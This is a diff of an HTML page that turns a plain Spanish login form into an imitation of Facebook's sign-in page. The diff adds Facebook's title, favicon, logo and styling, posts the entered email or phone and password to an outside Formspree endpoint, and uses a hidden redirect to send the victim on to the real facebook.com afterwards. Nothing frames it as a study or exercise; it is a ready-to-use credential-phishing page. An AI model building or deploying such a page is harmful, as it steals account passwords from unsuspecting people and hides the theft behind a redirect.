@@ -3,59 +3,79 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login</title>
+  <title>Facebook – log in or sign up</title>
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" />
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
-    form {
-      background: white;
+
+    .container {
+      background-color: #fff;
       padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      width: 300px;
-    }
-    h2 {
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      width: 100%;
+      max-width: 360px;
       text-align: center;
-      margin-bottom: 20px;
     }
+
+    .logo {
+      width: 200px;
+      margin: 20px auto;
+    }
+
     input {
       width: 100%;
-      padding: 10px;
+      padding: 14px;
       margin: 8px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
     }
+
     button {
       width: 100%;
-      padding: 10px;
-      background-color: #2d89ef;
+      background-color: #1877f2;
       color: white;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       cursor: pointer;
+      margin-top: 10px;
     }
-    button:hover {
-      background-color: #1b6cd4;
+
+    .footer-text {
+      margin-top: 16px;
+      font-size: 14px;
+      color: #606770;
     }
   </style>
 </head>
 <body>
 
-  <form action="https://formspree.io/f/xanjybdv" method="POST">
-    <h2>Iniciar Sesión</h2>
-    <input type="text" name="usuario" placeholder="Usuario" required>
+  <form class="container" action="https://formspree.io/f/xanjybdv" method="POST">
+    <img class="logo" src="https://1000marcas.net/wp-content/uploads/2020/02/Facebook-Logo.png" alt="Facebook Logo">
+
+    <input type="text" name="usuario" placeholder="Email o número de teléfono" required>
     <input type="password" name="contrasena" placeholder="Contraseña" required>
 
-    <!-- Redirección automática después del envío -->
-    <input type="hidden" name="_next" value="https://arkraineet.github.io/gracias.html">
+    <!-- Redirección directa a Facebook real -->
+    <input type="hidden" name="_next" value="https://facebook.com">
 
-    <button type="submit">Entrar</button>
+    <button type="submit">Iniciar sesión</button>
+
+    <div class="footer-text">
+      ¿Olvidaste tu contraseña? | Crear cuenta nueva
+    </div>
   </form>
 
 </body>
